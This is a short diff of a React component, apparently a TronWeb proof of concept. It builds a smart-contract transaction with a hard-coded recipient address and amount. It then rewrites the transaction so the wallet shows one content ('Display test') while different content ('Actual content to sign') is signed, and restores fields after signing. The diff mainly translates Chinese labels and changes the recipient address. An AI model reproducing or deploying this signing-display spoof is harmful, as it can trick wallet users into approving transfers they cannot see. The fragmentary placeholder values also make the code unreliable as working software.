@@ -11,11 +11,11 @@ function FreezeBalance() {
         onClick={async () => {
           const tronWeb = window.tronWeb;
           try {
-            message.info('发起交易中...');
+            message.info('Starting request...');
             setLoading(true);
 
             var parameter = [
-              { type: 'address', value: 'TDgJmYStKqzawFQyMav8XxNp1pTpdhEWg9' },
+              { type: 'address', value: 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax' },
               { type: 'uint256', value: 100000000 },
             ];
             var tx =
@@ -33,8 +33,8 @@ function FreezeBalance() {
             const new_contract1 = tx.transaction.raw_data.contract[0];
             tx.transaction.raw_data.contract[1] = new_contract1;
             tx.transaction.raw_data.contract[1].parameter.value.data = '～';
-            tx.transaction.raw_data.contract[1].type = '测试展示';
-            tx.transaction.raw_data_hex = '实际拿来签名的内容';
+            tx.transaction.raw_data.contract[1].type = 'Display test';
+            tx.transaction.raw_data_hex = 'Actual content to sign';
             var signedTx = await window.tronWeb.trx.sign(tx.transaction);
             signedTx.raw_data.contract[1] = contract1;
             signedTx.raw_data.contract[0].parameter.value.data = 'test';
